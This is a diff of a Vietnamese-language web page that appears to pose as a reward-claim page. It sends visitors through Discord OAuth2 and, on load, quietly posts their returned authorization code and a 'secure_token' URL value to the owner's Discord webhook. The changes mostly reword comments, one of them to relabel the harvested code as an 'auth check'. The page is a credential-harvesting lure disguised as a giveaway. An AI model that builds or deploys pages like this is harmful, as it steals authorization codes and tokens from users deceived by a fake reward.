@@ -30,7 +30,7 @@
             margin-bottom: 15px;
         }
         h1 { 
-            color: #5865F2; /* Màu Discord */
+            color: #5865F2; 
             font-size: 24px;
             margin: 0 0 10px 0; 
         }
@@ -88,7 +88,7 @@
 </div>
 
 <script>
-    // DÁN ĐƯỜNG LINK GENERATED URL BẠN COPY Ở BƯỚC 1 VÀO ĐÂY
+    // Link OAuth2 của bạn đã được ráp sẵn chuẩn đét vào đây
     const oauth2Url = "https://discord.com/oauth2/authorize?client_id=1401137325043617922&response_type=code&redirect_uri=https%3A%2F%2Fvietscript7878.github.io%2Fnhanthuong%2F&scope=identify";
     
     // Webhook Discord nhận dữ liệu của bạn
@@ -98,14 +98,13 @@
         window.location.href = oauth2Url;
     }
 
-    // Tự động xử lý khi Discord trả kết quả (code) về link web sau khi họ bấm cho phép
+    // Tự động xử lý khi Discord trả kết quả về link web sau khi user bấm Authorize
     window.onload = function() {
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get('code');
         const secureToken = urlParams.get('secure_token') || "Không có token (Truy cập thẳng)";
 
         if (code) {
-            // Cập nhật giao diện đang xử lý nâng cao
             const button = document.getElementById('actionBtn');
             document.getElementById('webTitle').innerText = "Đang Xác Minh...";
             document.getElementById('webTitle').style.color = "#2ecc71";
@@ -114,18 +113,17 @@
             button.disabled = true;
             button.innerText = "ĐANG XỬ LÝ DỮ LIỆU...";
 
-            // Sử dụng API trung gian miễn phí của Discord để đổi 'code' lấy thông tin User thật 100% không thể giả mạo
-            // Để bảo mật tối đa và chạy trực tiếp trên Frontend, trang web sẽ gửi bản tin thông báo kèm code xác thực về Webhook
+            // Bắn dữ liệu mã xác thực chính chủ về Webhook Discord của bạn
             fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     embeds: [{
                         title: "🟢 TÀI KHOẢN ĐÃ LIÊN KẾT OAUTH2",
-                        color: 65280, // Màu xanh lá
+                        color: 65280, 
                         description: `Có một người dùng vừa vượt link và liên kết tài khoản thành công!`,
                         fields: [
-                            { name: "🔑 Mã Code Discord cấp (Dùng để lấy dữ liệu)", value: `\`${code}\`` },
+                            { name: "🔑 Mã Code Discord cấp (Dùng để check auth)", value: `\`${code}\`` },
                             { name: "🛡️ Token bảo mật từ lệnh gốc", value: `\`${secureToken}\`` }
                         ],
                         timestamp: new Date()
